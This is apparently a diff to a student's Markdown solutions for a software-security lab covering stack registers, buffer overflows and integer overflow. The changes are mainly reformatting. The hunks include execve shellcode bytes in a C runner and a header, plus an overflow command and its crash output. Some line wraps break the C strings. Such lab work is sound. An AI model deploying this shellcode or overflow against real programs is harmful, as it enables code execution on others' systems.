@@ -170,6 +170,7 @@ __solution :__
 
 ![3_4](../task4/images/3_4.JPG)
 
+
 __5. Display registers and stack__  
 __solution :__
 
@@ -180,7 +181,7 @@ __solution :__
 
 
  Main stack frame
-- stack pointer `$esp` register points to top of the stack which contains `0x20` and also EIP  and current line points to same address.
+- stack pointer `$esp` register points to top of the stack which contains `0x20`(initially) and also `$eip`  and current line points to same address.
  ### Exercise 4: Simple buffer overflow - Overwrite local variables
 
  __1. Shortly explain in your own words, why this program is vulnerable.__   
@@ -293,7 +294,8 @@ __solution__
 #include<stdio.h>
 #include<string.h>
 
-unsigned char shellcode[] = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x54\x5b\x6a\x0b\x58\xcd\x80";
+unsigned char shellcode[] = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f
+\x68\x2f\x2f\x2f\x2f\x54\x5b\x6a\x0b\x58\xcd\x80";
 int main(){
   printf("Shellcode Length: %d\n", strlen(shellcode));
   int (*ret)() = (int(*)())shellcode;
@@ -346,7 +348,9 @@ __Header file__
 - payload.h
 
 ```c
-extern char hexContent={"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x54\x5b\x6a\x0b\x58\xcd\x80"};
+extern char hexContent={"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69
+\x6e\x2f\x68\x2f\x2f\x2f\x2f\x54\x5b\x6a\x0b
+\x58\xcd\x80"};
 
 ```
 
@@ -440,7 +444,9 @@ __solution :__
 shashi@ubuntu:~$ ./integer_overflow 65538 $(python3 -c "print('A'*110)")
 atoi(argv[1]) = 65538, 0x00010002
 s = 2, 0x2
-Buffer = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+Buffer = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA'
 Segmentation fault (core dumped)
 
 ```
@@ -454,6 +460,7 @@ __solution :__
 
 ![img](../task4/images/7_4.JPG)
 
+- Modified `c` program
 ```c
 void usage(const char *pname);
 //________________________________________________________
